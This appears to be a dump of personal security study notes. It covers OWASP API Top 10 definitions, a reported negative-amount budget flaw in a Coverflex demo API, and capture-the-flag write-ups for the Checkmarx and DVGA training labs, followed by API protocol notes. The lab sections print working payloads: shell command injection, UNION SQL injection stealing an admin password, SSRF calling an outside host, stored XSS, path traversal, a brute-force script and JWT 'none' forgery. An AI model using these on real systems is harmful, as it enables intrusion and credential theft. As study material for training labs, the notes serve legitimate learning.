Definitions Object It describes information about a particular thing. A user object might describe roles, names, usernames. A json object describes key-value pairs of information. Authentication It's the process of proving who you said you were when you registered yourself . Tipically done by a username and password. Data It's what information is made up of, data by itself isn't useful. When combined, it becomes information and is then useful. Resources It's the intellectual/physical property of a certain thing, which can be used with a given purpose or not. In the context of web application, a resource can be a scroll page with articles. Rate-Limiting It's how you throttle requests, by blocking them when you receive too many. Function It does a particular action. Its an operation OWASP API TOP 10 Broken Object Level Authorization - It happens when you are able to access an object which you should not have access to. There is nothing wrong with manipulating the id of an object, the problem arises when a given user has the permissions to access an object he should not have permissions to access. Eg: /shop/user?id=1 Broken User Authentication - Its any operation over authentication that allows an attacker to login as someone else. Eg: OR 1=1 -- Excessive Data Exposure - Its the visualization of an object which is to sensitive to show but is perceivable by the users anyhow. Eg: password key-value pair in JSON body. Lack of Resources & Rate Limiting - Its any operation that exceeds the maximum amount of resources a server can provide because there are no restrictions to how many the client can ask. Eg: ?limit=2000000 Broken Function Level Authorization - Its any operation accessed by a user whose permissions should not allow him to access. Eg: /admin/email?deleteEmailName= Mass Assignment - Its legitimate api calls that an attacker shouldn't have access to in any given endpoint. A user can set himself to admin, if an object in the backend exists that checks if the property admin is true, and the attacker sets it to true via the API. Eg: \"admin\":true Security Misconfiguration - Its anything that is misconfigured to allow an attacker access to sensitive information or do sensitive operations. Eg: redis , DELETE on unporposeful endpoint Injection - Its anything that allows code or commands to be injected in a particular sink such as system in python, eval in js/php. Eg: \".phpinfo().\" Improper-Assets-Management - Developers can't rewrite an API because they included new functionality code to the frontend, so they include new versions of their API and new endpoints towards those versions. An attacker can simply change the version of the api by changing the endpoint (v3 => v2), which could allow him access to older less secure features. Eg: /v2/login/ => /v1/login Insufficent Logging & Monitoring - The application does not log anything or few things and that means it won't be aware of any actions uninteded or intended, malicious or unmalicious that the client does. Vulnerable? If a user can access objects he does not have permissions to access, yes. If there's a way a user can login as another user by exploiting a particular authentication vulnerability such as NoSQLi, SQLi, credential stuffing, then yes. If an Object contains sensitive info that should not be shown and a user is able to see it, then yes. If there is no restriction to the ammount of resources a user can ask, then yes. If a user is able to perform an operation he should not have access to, then yes. If the user is able to legitemately manipulate the API to do things he should not do. If there is somekind of misconfiguration that allows user access to sensitive information, then yes. If user input goes to a sink which allows codes or commands to be injected, then yes. If there's an older version of the api that an attacker can shift to, then yes. If the application does not log or logs very few things, then yes. Char49 TIPS 10 - Insufficent Logging & Monitoring Notice the lack of headers, body - In fact, there is no useful information that seems to be logged. 9 - Improper Assets Management. Remember old api endpoints don't necessarily have the same sub-endpoints. 8 - Injection Taking input directly to the terminal It is not the same as running a system function. 7 - Security Misconfigurations Disclosure of sensitive information can can result in mongodb database leak at port 27017, for example. 6 - Mass Assignment Can be used to bolster any type of privilege. 5 - Broken Function Level Authorization Operations that users aren't supposed to execute with their current authorization level 4 - Lack of Resources & Rate-Limit We can increase the limit value in the query string to increase stress on the server 3 - Excessive Data Exposure Rule of thumb: If it's not rendered and is in output, it should be excessive data exposure 2 - Broken User Authentication There are various techniques, but no rate-limit will surely lead to full account takeover.

Description This vulnerability arises when a manager sets a budget to an employee. Whilst the unprivileged user refunds that budget via: https://my-demo.coverflex.com/budgets/reimbursement/new , if he communicates directly with the API, he is able to give a negative amount . When a negative value is given and subtracted from the budget, the math becomes: budget = budget - (-amount) = budget + amount , thus the budget is increased. Following this, the employee can then use the accumulated budget to ask for a larger refund than what the budget's design allows. Instructions Login with a manager. In the manager dashboard go to budgets and add a new budget. Give it a value of 500\u20ac, assign it to the employee you logged in as. Login with a employee account in the website. Also substitute the [EMAIL] and [PASSWORD] fields in this curl command and run it to save the Authorization: Bearer token: curl -i -s -k -X $'POST' -H $'Host: demo-menhir-api.coverflex.com' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Content-Length: 78' -H $'Origin: https://people-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://people-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' --data-binary $'{\\\"email\\\":\\\"[EMAIL]\\\",\\\"password\\\":\\\"[PASSWORD]\\\"}' $'https://demo-menhir-api.coverflex.com/api/business/sessions' In the employee dashboard, go to budgets and click the budget you just created.

Kudos. Checkmarx. Definitions Functional View - What is it? This form of recon ascertains the functionality of the web app. For example, what is the website's purpose? Does it have login capabilities? If so, can I register an account? What can I do upon logging in? This is a very important phase of the recon process. You won't break anything if you don't understand how it was built. Technological View - What is it? This is the next phase after the functional view of the recon process. Purposefuly made to acquire information related to technology. Which server hosts the app? Is there a framework linked to that? What ports are open? Is it the same server running on that port? Does it have an API? What's the backend language? OSINT View - What is it? This is my final phase of the recon process. It's about researching of the technologies and functionalities discovered before. If it's using FastAPI, for example, are there any default config, db, env files? Basically, google to find open source intelligence information about my discoveries. Recon localhost:4100 Functional View Home Page The main page is a feed with posts from various different users. Tags will filter the posts. Reading every post is very important to attain information. By clicking on the Dev Updates #4 , I read there are unsecured endpoints. (DevOps and Administrative endpoints). After clicking on the post I am Pikachu! , I see there is an email: Pikachu@checkmarx.com . Sign up Page In order to sign up, I need a username , a email and a password . I create my account and it automatically logs me in. Settings Page It allows me to set an image, change my username, email, password, set a bio and logout. New Post Page It allows me to create an article which is composed by a title , summary , write an article in markdown and add tags which can be used for filtering purposes. My Profile Page It simple shows my articles and favorited articles. Technological View The most common way to acquire technology information about the target is to analyze headers and produce errors. Maybe a null byte (It's keen to a stop sign. It will stop, in this case, the processing of the string), in the url will produce a 500 that leaks information about the backend? A simple head request could return a Server header. It is important to emphasize that the information can be faked. It is the responsability of the researcher to understand what is true and what is not. Curling the root of the url, http://localhost:4100/ , the X-Powered-By header is present with a value of Express . This means javascript could be running on the backend of the server at port 4100. To confirm that, I open the source code, since there could be another hint to another backend server. Nothing hints at another server but an interesting file is found: http://localhost:4100/static/js/bundle.js I take note of it and continue curl a page I knew did not exist: http://curl -I localhost:4100/123 The same header is present. I run an nmap to find which ports are open that server: nmap -sS -sV -p- --min-rate=500 localhost . This scan basically initiates a connection and ends it halfway, discovering if the port is open or not, due to the server's response halfway through the connection. There are various ports open but the one which interests me more is 8000 and 6379 OSINT View I start googling for sensitive files express could have. (Config files, env files, db files, etc). But quickly find out most of express's configuration is done via the terminal, and that express is simply a framework to create web applications and apis, and as such does not come with default configuration files that you can access via the http protocol. localhost:8000 Functional View The nmap scan shows us it's an http server, therefore it can be opened in a browser. It returns a 404 status code, implying there is no route for GET at / . Going a step back, I re-opened the application at 4100 and opened up BurpSuite. (It's an application which allows me to \"grab\" or intercept a network request, edit it, and then send it off again.). With intercept mode on, I login and see it makes a request to the same host at port 8000 on an endpoint /api . This means the frontend (blog) communicates with the backend through the API. Everything goes to the API before going to the backend. The though process now is to use the functionalities of the web application, whilst intercept is on, to see how communication is done with the API. By clicking on the homepage, I see it makes a request to the same server at port 8000 on the endpoint /api/articles?limit=10&offset=0 So it may not be a paged file but instead a scroll file. The limit is the maximum ammount of articles which can appear and the offset is from which article to show. By clicking on my profile I see it makes a request to /api/profiles/android and that shows interesting json attributes: admin , cardName , cardNumber , cardCvc , cardExpiry Updating my profile sends a PUT request to /api/user/ with a json body. By creating an article I see it makes a POST request to /api/articles with a json body again. Cicking on a post sends a GET to /api/articles/<post_name> Taking into account the requests it just made to the API, I can conclude it is using an API of type REST, because it's using the whole of the http protocol to communicate throughout different endpoints. Technological View. Curling with a head request at http://localhost:8000 , I see it uses a server called uvicorn . Another curl head request to a 404 directory on that server: http://localhost:8000/123 . It also shows uvicorn. OSINT View After googling what uvicorn is, I see its a python based server for the ASGI specification. Its basically an asynchronous web server. It can use various API frameworks. After googling for specific endpoints for each framework, I find one that returns a 200. It is /docs . It simply compiles the information from openapi.json into a more familiar and readable format. To be truthful, /docs is a very common endpoint, but, in this case, means the framework is utilizing FastAPI . Exploitation First Flag Whilst analyzing the docs, I notice an admin attribute at /api/user . This means, according to the API, there is an attribute admin linked to the backend code, which, when set, will make me admin . Basically, logically speaking, somewhere in the backend, there is a conditional check keen to: if(user.admin) { admin stuff } . Go to settings page of the frontend. Click update settings with intercept on. Write in json format the following json key-pair value: \"admin\":true to the body of the json request. Send it off. You are now admin The flag is: flag{M4sS_AsS1gnm3nt} - Belongs to: Mass Assignment Do not let the user change its own role, especially to roles with higher privileges. Second Flag The next endpoint at the docs which seems interesting is the /api/debug/ endpoint. By the looks of it, it sends a command, by default, uptime to the server. It is a linux command, which implies that, most likely, since its python, there is a system function call with user input in it. We can injection arbitrary shell functions then. See it as a connection between your computer and the API. Everything in that input will be seen by the computer as a command. Copy the default body from /docs and paste it onto the repeater. Replace uptime with uptime; ls; and a flag is received. It is: flag{1nject10n_Ap1} - Belongs to: Injection Do not use the system function. More clearly, do not send user input to functions which allow execution of commands. Third Flag Taking a peak at the docs, I see endpoints, which, when receiving a DELETE request, will delete an article or comment. The thought process here is, according to the logic of the application, that a normal registered user shouldn't be able to delete other user's privilege. An admin? Sure. But a regular user? Is it really necessary to allow a regular user to delete other's comments and articles?. Stop being admin by sending a PUT request to /api/user but with admin set to false. (Like we did the last time, intercept the request at /settings and add a json attribute like: \"admin\":false ). It allows the request and deletes the article. This means that in the backend there is code which does not validate the permissions correctly. Maybe the regular-user and admin-user classes both inherit from User and it was forgotten to unvalidate some permissions? Re-devoloping the code isn't a good idea. You can simply check if a user is admin, and if so, allows the request to delete other user's articles and comments. If not, it only allows to delete his own articles. The flag is: flag{B0lA!!!!!} - Belongs to: Broken Object Level Authorization Fourth Flag There's another port open. It is: 6379 . It's hosting redis, a database. Redis-cli is a command line program to communicate with it. Simply open a terminal, write redis-cli -h 127.0.0.1 and notice a database shell opens. Redis uses keyspaces to enumerate existing db's. That is, keyspace 0 means there is a db 0. To do that, write INFO keyspace . It will output the number of the database you need to select. Take into account this is only possible because there is no user authentication. The security misconfiguration happens because an attacker can interact with the server without authentication. Write SELECT 0 and enumerate all the keys with KEYS * . There's one called flag. Get it with GET flag . The flag is: flag{5eC_M1sc0nF1g} - Belongs to: Security Misconfiguration Fifth Flag If you provide a way to associate sentitive info with a profile, do not show that sensitive info in the API or frontend. Keep it in the backend. And if you do decide to show it, show only to the current user. Noticing the user's profile's returns card info, and that one user told he was giving away money, I concluded he had associated his card info. As such I did a GET to /api/profiles/TeamR$cket and there it was, his credit card info. I remembered the membership options and decided to test his card there. It worked a flag popped up. It is: flag{3xc3ss1v3_daTa_Xp0sur3} - Belongs to: Excessive Data Exposure Sixth Flag Most users re-use passwords and use passwords with personal information. In this case, the user Pikachu made a post with his favorite pokemons. Deductive reasoning led me to believe it could be one of his passwords. After placing the pokemon list on intruder and attempting each one to login, the last one let me in. The password is snorlax and the flag is: flag{br0k3n_uS3r_4uthEnt1cAt1oN} - Belongs to: Broken User Authentication Locking the account after 3-5 failed login attempts should fix this. You can't allow a user to bruteforce his way through your login system, as that will lead to a broken authentication system. Seventh Flag After logging on Pikachu, we can see there's a logging endpoint. We test it on the frontend and a message is displayed saying there is no logging or monitoring. We test it on the backend/API and we get a flag: flag{InsUfF1C3nT_L0gG1nG} - Belongs to: Insufficient Logging Lack of logging is problematic. You want to know who logged in and where, who takes action X or not. Logs are important to keep track of everything that happens in the application. Eighth Flag There's a post by Hodor which says there are administrative endpoints. We test it on the frontend with /admin/ and it is deprecated. We test it on the backend/API with /api/admin and we get a flag! flag{BFL4_I_aM_Th3_aDm1n_H3r3!} - Belongs to: Broken Function Level Authorization A normal user should not be allowed to access administrative endpoints, the backend code needs to make a check which looks at the user's roles and see's if it has the necessary ones to enter an admin endpoint: if(user.admin) { allow } else { do not } Ninth Flag Scrolling pages need to have a defined limit, a maximum number of articles, in this case, that it shows. Otherwise you can stress the database by asking too many, leading to a DoS. The limit parameter, in this case, we can change it to 200000 and we provoke rate-limiting issues and thus we get the flag: flag{L4cK_0f_R3s0urc3S_&_r4t3_L1m1t1ng} - Belongs to: Lack of Resources & Rate-Limiting Tenth Flag Developers often need to re-write parts of an API because they add new functionality to the frontend and need a way to communicate with the backend. Thus leading to a new directory, for example, v3 with the updated API.

One simply needs to ascertain the context in which injection occurs and validate the resulting SQL statement. In this case, the web application, with the below payload, returns errors from which we can deduce user input is directly inputted in the SQL statement. query={pastes(filter:\"1'\"){content}} SInce this is an error based SQLi we have output, and that means we can directly exfiltrate the information by constructing an appropriate query. Steal admin username: {pastes(filter:\"a'%20UNION%20SELECT%201%2c%202%2c%20password%2c%204%2c%205%2c%206%2c%207%2c%208%20FROM%20users%20+WHERE+username+=+'admin'+--\"){content}} This queries uses the UNION directive, which takes the results from two statements and places them on one virtual table. In this case, the first table, the one of the left, does not have an output, and the second query only has one. In order to find out which field is being reflected in the response, we can simply do SELECT 1, 2, 3, 4, 5, 6, 7, 8 and see which number is reflected, then we need only to replace, in the constructed statement, the number, for the field we want to SELECT. In this case, we care about the password field, so all we need to do is replace it with corresponding number. SSRF Server-Side Request Forgery - As the a name implies, a request is made server-side. In this case, it's not blind, as the html of the site requested is fully reflected onto the page. SSRF can be damaging. As it is server side, one can replace a simple http:// request, with, for example, file:// , then the server will interpret it as a directive to look into its own file system, and will then reflect the file you give it from there. {\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\\n result\\n }\\n }\",\"variables\":{\"host\":\"eowhrtbaia65ev1.m.pipedream.net\",\"port\":443,\"path\":\"/\",\"scheme\":\"https\"}} Stored XSS & HTML Injection Stored XSS, or persistent XSS, means user input is reflected onto the html without proper validation and is stored in a databse, which means everytime you open the page, the payload will execute. Whether it be JS code or HTML code. {\"query\":\"mutation{createPaste(title:\\\"swag'<script>alert(1);</script>\\\",content:\\\"swag2'<script>alert(1);</script>\\\"){paste{title,content}}}\"} OS Command Injection OS Command Injection - This implies the direct use of input to the shell or simply a system function with input made by the user. That sink, or direct communcation with the shell, allows us to inject arbitrary commands on any host for as long as the host has those commands available. query={systemDebug(arg:+\";+sleep+10;\")} {\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\\n result\\n }\\n }\",\"variables\":{\"host\":\"localhost\",\"port\":80,\"path\":\"/; uname -a;\",\"scheme\":\"http\"}} Discovering GraphQL - Discovering graphql is as simple as trying out a few of the common endpoints, as that is usually where it is installed. GET /graphql Resource Intensive Query Attack - {pastes(limit:100000){title,public,owner{paste{title,public,owner{paste{title,public,owner{paste{title,public}}}}}}}}} This happens because of circular logic. One object leads to another and that same object leads to the first one. This can be used to skip authorization checks or DoS. If we construct a query with the needed ammount of depth, we can DoS. If we use the circular logic to access like this: query={users(username:\"yourusername\"){posts(made_by:\"notyourusername\"){users{username}}} , we can bypass authorization checks. Batch Query Attack - mutation{login(username:\"admin\",password:\"admin\"){accessToken,refreshToken}second:login(username:+\"admin\",password:\"123456\"){accessToken,refreshToken}} or python CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv Batch queries - Means we can use a first query, then a second query, which means, multiple queries at the same time, can facilitate bruteforce. Aliases based Attack - Aliases are means to call the same object in two different ways so that they don't conflict. For example: { empireHero: hero(episode: EMPIRE) { name } jediHero: hero(episode: JEDI) { name } } WIth result: { \"data\": { \"empireHero\": { \"name\": \"Luke Skywalker\" }, \"jediHero\": { \"name\": \"R2-D2\" } } } query=query{q1:systemUpdate+q2:systemUpdate+q3:systemUpdate} Means we can create aliases for Objects and as such can do multiple queries of the same type at the same time, If enough queries are made, this can lead to DoS. GraphQL Query Deny List Bypass This can be done, if the check is done via operation name, by finding a way to rename the operation. Either via operation name or aliases, for example. This happens because the backend looks for a name which does not exist, as it was renamed by changing the operation name to an arbitrary value or creating an alias for that operation. { \"query\":\"{q1:systemHealth}\" } or { \"query\":\"query getPastes{systemHealth}\" } Arbitrary File Write & Path Traversal This happens because there is a sink in the source code which opens a file, allows traversal and then writes to it. In this case particularly, I can bet its the open function of Python with the w flag. It takes direct user input onto it and as such we can traverse and write arbitrarily mutation { uploadPaste(filename:\"../../../../../tmp/file.txt\", content:\"hi\"){ result } } GraphQL weak password protection Basically, there is no rate limit checking in place, and as such an attacker can send as many requests as he wants. This means he will be able to crack a password. Here is an example script: # Brute Force attack with a list of passwords: passwordlist = ['admin123', 'pass123', 'adminadmin', '123'] for password in passwordlist: resp = requests.post('http://host/graphql', json = { \"query\":\"query {\\n systemDiagnostics(username:\\\"admin\\\", password:\\\"{}\\\", cmd:\\\"ls\\\")\\n}\".format(password), \"variables\":None }) if not 'errors' in resp.text: print('Password is', password or you can use CrackQL: query{systemDiagnostics(username: \"admin\", password: {{password|str}}, cmd: \"sleep 10\") {}} Place this in a arbitrary named file with extension graphql: mypayload.graphql Pass it to CrackQL like: python CrackQL.py -t http://localhost:5013/graphql -q mypayload.graphql -i sample-inputs/passwords.csv``` GraphQL Interface There's an interface that allows to query GraphQL in a friendly way. Simply browse to http://localhost:5013/graphiql . If needed, set the graphiql:disabled cookie by switching disabled with enabled <=> graphiql:enabled JWT Token Forge This works because we can change the signing key to none and the server accepts that. Basically, the logic goes like this: We change the algorithm to none => send it to the server => recognizes that type => lets it pass without verifiying the signature because it accepts jwt's without one. To reproduce this, login as operator: {\"query\":\"mutation{login(username:\\\"operator\\\",password:\\\"password123\\\"){accessToken}}\"} Copy the accessToken (save it somewhere if you want). Go to token.dev Paste the token Change the algorithm to none Change user to admin Send a request like this but replace the token with yours (don't forget to include a . at the end of the token). {\"query\":\"{me(token:\\\"<your_token_here>\\\"){id,username,password}}\"} Send the request, notice you are admin and you have the password. Field Duplication Attack This happens because there's no restraint to how many fields can be inside a query. This can stress the server, leading to a DoS query { pastes { owner { pastes { ipAddr # 1 ipAddr # 2 ipAddr # 3 ipAddr # 4 ipAddr # 1000 } } }","title":"Dvga"},{"location":"ctfs/dvga/dvga/#dvga","text":"It's a vulnerable graphql application mean't to train users in graphql hacking.","title":"DVGA"},{"location":"ctfs/dvga/dvga/#reconessaince","text":"","title":"Reconessaince"},{"location":"ctfs/dvga/dvga/#discovering-graphql-endpoint","text":"I started by using the application like a normal user, figuring out what it did but with BurpSuite open.

That sink, or direct communcation with the shell, allows us to inject arbitrary commands on any host for as long as the host has those commands available. query={systemDebug(arg:+\";+sleep+10;\")} {\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\\n result\\n }\\n }\",\"variables\":{\"host\":\"localhost\",\"port\":80,\"path\":\"/; uname -a;\",\"scheme\":\"http\"}} Discovering GraphQL - Discovering graphql is as simple as trying out a few of the common endpoints, as that is usually where it is installed. GET /graphql Resource Intensive Query Attack - {pastes(limit:100000){title,public,owner{paste{title,public,owner{paste{title,public,owner{paste{title,public}}}}}}}}} This happens because of circular logic. One object leads to another and that same object leads to the first one. This can be used to skip authorization checks or DoS. If we construct a query with the needed ammount of depth, we can DoS. If we use the circular logic to access like this: query={users(username:\"yourusername\"){posts(made_by:\"notyourusername\"){users{username}}} , we can bypass authorization checks. Batch Query Attack - mutation{login(username:\"admin\",password:\"admin\"){accessToken,refreshToken}second:login(username:+\"admin\",password:\"123456\"){accessToken,refreshToken}} or python CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv Batch queries - Means we can use a first query, then a second query, which means, multiple queries at the same time, can facilitate bruteforce. Aliases based Attack - Aliases are means to call the same object in two different ways so that they don't conflict. For example: { empireHero: hero(episode: EMPIRE) { name } jediHero: hero(episode: JEDI) { name } } WIth result: { \"data\": { \"empireHero\": { \"name\": \"Luke Skywalker\" }, \"jediHero\": { \"name\": \"R2-D2\" } } } query=query{q1:systemUpdate+q2:systemUpdate+q3:systemUpdate} Means we can create aliases for Objects and as such can do multiple queries of the same type at the same time, If enough queries are made, this can lead to DoS. GraphQL Query Deny List Bypass This can be done, if the check is done via operation name, by finding a way to rename the operation. Either via operation name or aliases, for example. This happens because the backend looks for a name which does not exist, as it was renamed by changing the operation name to an arbitrary value or creating an alias for that operation. { \"query\":\"{q1:systemHealth}\" } or { \"query\":\"query getPastes{systemHealth}\" } Arbitrary File Write & Path Traversal This happens because there is a sink in the source code which opens a file, allows traversal and then writes to it. In this case particularly, I can bet its the open function of Python with the w flag. It takes direct user input onto it and as such we can traverse and write arbitrarily mutation { uploadPaste(filename:\"../../../../../tmp/file.txt\", content:\"hi\"){ result } } GraphQL weak password protection Basically, there is no rate limit checking in place, and as such an attacker can send as many requests as he wants. This means he will be able to crack a password. Here is an example script: # Brute Force attack with a list of passwords: passwordlist = ['admin123', 'pass123', 'adminadmin', '123'] for password in passwordlist: resp = requests.post('http://host/graphql', json = { \"query\":\"query {\\n systemDiagnostics(username:\\\"admin\\\", password:\\\"{}\\\", cmd:\\\"ls\\\")\\n}\".format(password), \"variables\":None }) if not 'errors' in resp.text: print('Password is', password or you can use CrackQL: query{systemDiagnostics(username: \"admin\", password: {{password|str}}, cmd: \"sleep 10\") {}} Place this in a arbitrary named file with extension graphql: mypayload.graphql Pass it to CrackQL like: python CrackQL.py -t http://localhost:5013/graphql -q mypayload.graphql -i sample-inputs/passwords.csv``` GraphQL Interface There's an interface that allows to query GraphQL in a friendly way. Simply browse to http://localhost:5013/graphiql . If needed, set the graphiql:disabled cookie by switching disabled with enabled <=> graphiql:enabled JWT Token Forge This works because we can change the signing key to none and the server accepts that. Basically, the logic goes like this: We change the algorithm to none => send it to the server => recognizes that type => lets it pass without verifiying the signature because it accepts jwt's without one. To reproduce this, login as operator: {\"query\":\"mutation{login(username:\\\"operator\\\",password:\\\"password123\\\"){accessToken}}\"} Copy the accessToken (save it somewhere if you want). Go to token.dev Paste the token Change the algorithm to none Change user to admin Send a request like this but replace the token with yours (don't forget to include a . at the end of the token). {\"query\":\"{me(token:\\\"<your_token_here>\\\"){id,username,password}}\"} Send the request, notice you are admin and you have the password. Field Duplication Attack This happens because there's no restraint to how many fields can be inside a query. This can stress the server, leading to a DoS query { pastes { owner { pastes { ipAddr # 1 ipAddr # 2 ipAddr # 3 ipAddr # 4 ipAddr # 1000 } } }","title":"Flags"},{"location":"dvwss/notes/","text":"","title":"Notes"},{"location":"goatlin/notes/","text":"Goatlin Notes M1 Content Provider A Content Provider provides data to android applications such as activities, services or receivers.

Remote Procedure Call - It's a way of asking for services from one program to another remotely. The client requests and the server provides, Internals of RPC Basically, the input parameters are passed to the RPC. They parameters may not be raw, as certain data types may have different representations varying from machine to machine. The remote host executes the RPC after the parameters arrive. When an RPC program is called, it uses portmap to bind itself to a port, and the remote machine's RPC also contacts portmap to find the corresponding port number it needs to call the procedures by the application that asked to call them. The RPC program is assigned an integer identifier known only to those who will call its procedures. They are also assigned an integer number. That's how the remote RPC know what to call. Logic process of an RPC. The RPC is called client side => parameters and the method to be called are marshalled => data is sent over over established ports known to both of the parties => data is unmarshalled server side => data is executed server side => return value is sent to client side. Rest What is it? Rest is an api protocol that uses the entirity of http protocol to perform what it needs to do. It utilizes the verbs, headers, various endpoints. If I see an API that uses the verb DELETE in an endpoint to erase an account, and a GET to fetch it in another endpoint, than I immediatly know it is using REST As per good practices, the verbs have methodologies: The GET retrieves a resource The PUT changes the state or updates a resource. The POST creates a resource The DELETE removes it. Vulnerabilities arise mostly when there are misconfigurations in these things. For example, if an application uses DELETE to erase an email, which means, to erase a resource, how would it react to erasing resources that should not be erased? Eg: GET /profile => DELETE /profile . Divergencies can also be a root cause. If, for example, there's an admin attribute in a User Class and a normal user can set that to true, either by updating the resource or creating a new one, then there is cause for alarm. In my opinion all vulnerabilities in API walk hand in hand, that is, for example, you normally can't do credential stuffing (BUA) if there is a rate-limit check in place. If you access an admin behaviour that allows you to enumerate the User Object, then you also have a BOLA and not only a BFLA. It's important to consider that one vulnerability can lead to another. Creativity is key in these thought processes. The obvious point is that you can only be creative if you pay attention to all the details. Maybe the BFLA reflected in the logs and you can get a log injection. Otherwise, it could have been sent to a database and you can get an SQLi. Most representations of the REST requested resource will be JSON or XML. Resources should be uniquely identifiable from a single URL. Operations must be stateless, and any state necessary shall be done in the client All resources should allow caching, unless explictly indicating caching is not possible. EXAMPLES OF REST REQUESTS. GET /api/user/messages HTTP/2 POST /api/user/messages <headers> { \"message_1\": \"Hello\" } Useful Link : https://hackerone.com/reports/384782 SOAP What is it? SOAP Relies heavily on XML - every operation provided by the service is explicitly written in XML and received back in the same format. Each input parameter is bound to a type. This all codified in WDSL, which is used to describe the functionality of a webservice. A SOAP request is composed of the following: soap:Envolope - Describes the XML as SOAP type. soap:Header - Is able to load SOAP modules soap:Body - Bulk of the SOAP message (payload) soap:Fault - For error messages. Only soap:Envolope and soap:Body are actually required. Vulnerabilties arise from improper usage of the input supplied within the SOAP request. These can be: Injection( SQli, CMDi, XAML) , XXE , MitM by SOAP action spoofing , XSS , Broken Access and Authorization , DoS Example SOAP REQUEST <?xml version=\"1.0\"?> <soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\" soap:encodingStyle=\"http://www.w3.org/2003/05/soap-encoding\"> <soap:Body> <m:GetUserResponse> <m:Username>Tony Stark</m:Username> </m:GetUserResponse> </soap:Body> </soap:Envelope> Useful Link : https://hackerone.com/reports/36450 JSON-RPC What is it? JSON-RPC means all the requests are made through JSON onto a single page. These can call specifc methods and params to that, along with an ID. The response is usually composed by a result object, error object and an id. Useful Link : https://hyperchain.readthedocs.io/en/latest/JSON-RPC_manual.html Example JSON-RPC --> {\"jsonrpc\": \"2.0\", \"method\": \"subtract\", \"params\": {\"minuend\": 42, \"subtrahend\": 23}, \"id\": 3} <-- {\"jsonrpc\": \"2.0\", \"result\": 19, \"id\": 3} Useful Link : https://hackerone.com/reports/303390 XML-RPC What is it? XML-RPC Utilizes the HTTP protocol and the POST method to pass a XML document contained in the body. Based on that, it generates the parameters for the function code to be executed and sends a response back in XML with the return value. It supports the following datatypes: Data type Tag example Description array <array><data>\u2026</data></array> A list that can contain multiple values or data types base64 <base64>SGFsbG8gV2VsdA==</base64> Base64-encoded binary data boolean <boolean>1</boolean> Boolean variable (true = 1 vs. false = 0) dateTime.iso8601 <dateTime.iso8601>20200414T16:23:55</dateTime.iso8601> Date and time in ISO 8601 format double <double>-0.32653</double> Double precision floating point number (64-bit) integer <int>32</int> or <i4>32</i4> Integer (whole number) string <string>Hello world!</string> String of characters; can contain zero bytes struct <struct><data>\u2026</data></struct> Set of key-value pairs (keys in this case are character strings and values can be any type) Example XML-RPC <struct> <member> <name>entry 1</name> <value><int>1</int></value> </member> <member> <name>entry 2</name> <value><int>2</int></value> </member> </struct> Useful Link : https://hackerone.com/reports/500515 gRPC What is it? It's a modern open source remote procedure call that runs in any environment. Like in all RPC's the methods must exist client side and server-side. They are established via protobuffers - messages with name-value pairs called fields inside. Once compiled via the gRPC, they generate classes which implement the methods and attributes required to run the RPC. If we do everything correctly (place the methods in each respective machine), all we need to do is call the RPC via the client. Example .proto service HelloService { rpc SayHello (HelloRequest) returns (HelloResponse); } message HelloRequest { string greeting = 1; } message HelloResponse { string reply = 1; } This will generate a class in the language we choose. GraphQL What is it? It's a query language and server side run time for API's that prioritizes giving clients the data they request. It's designed to make API's fast and flexible GraphQL terms Schema describes all the possible data clients can query. It's used to validate queries. type Character { name: String! appearsIn: [Episode!]! } In this example, character is of Object Type. Meaning it has fields. The field name is of type String! and appearsIn is of type Episode! The brackets means its an array. type Starship { id: ID! name: String! length(unit: LengthUnit = METER): Float } In this example we see the fields can have zero or more arguments. Field, in this case, unit has one argument: LengthUnit. Meter is default if it's not passed. Query It's the default. Queries are composed by fields within fields. Example Query query { repository(owner:\"octocat\", name:\"Hello-World\") { issues(last:20, states:CLOSED) { edges { node { title url labels(first:5) { edges { node { name } } } } } } } } In this query, we fetch repository from octocat with name Hello World, finds the 20 most recent closed issues and returns each issues title and url and the first 5 labels. Mutations Are used for modifications. They have a name, input object and payload object. The input object is composed of input fields, the data to be inserted is passed as the value of that input field. The payload object is the data I want to return from the server. It's composed of return fields. It's the body of the mutation name. Example Mutation mutation AddReactionToIssue { addReaction(input:{subjectId:\"MDU6SXNzdWUyMzEzOTE1NTE=\",content:HOORAY}) { reaction { content } subject { id } } } Variables make queries more dynamic and powerfull. They are declared in the root of the query and passed within the operation. Example Query with variables query($number_of_repos:Int!) { viewer { name repositories(last: $number_of_repos) { nodes { name } } } } variables { \"number_of_repos\": 3 } Fragments can be used to share logic being any declared Object. Example fragment schema fragment NameParts on Person { firstName lastName } Example query with usage of a fragment query GetPerson { people(id: \"7\") { ...NameParts avatar(size: LARGE) } } You precede an included fragment with three periods (...) Directives allows us to do conditional logic, that is, imagine a particular application has a admin or not admin status. If you are admin you see admin stuff, if you are not, you won't. Directives solve this. Example schema with directives hero(episode: $episode) { name friends @include(if: $withFriends) { name } } } Example query with directives value set { \"episode\": \"JEDI\", \"withFriends\": false } Enum allows us to validate enum values agains't schema values. Basically it makes sure that the values in the schema match the ones in the enum. Example enum schema enum Episode { NEWHOPE EMPIRE JEDI } Interface basically ensures a type object implemented from another object will have the types from the other object. Interface Examples Schema interface Character { id: ID! name: String! friends: [Character] appearsIn: [Episode]! } type Human implements Character { id: ID! name: String! friends: [Character] appearsIn: [Episode]! starships: [Starship] totalCredits: Int } type Droid implements Character { id: ID! name: String! friends: [Character] appearsIn: [Episode]! primaryFunction: String } Unions let us get only one type of the types selected. Example Union union SearchResult = Human | Droid | Starship search(text: \"an\") { __typename ... on Human { name height } ... on Droid { name primaryFunction 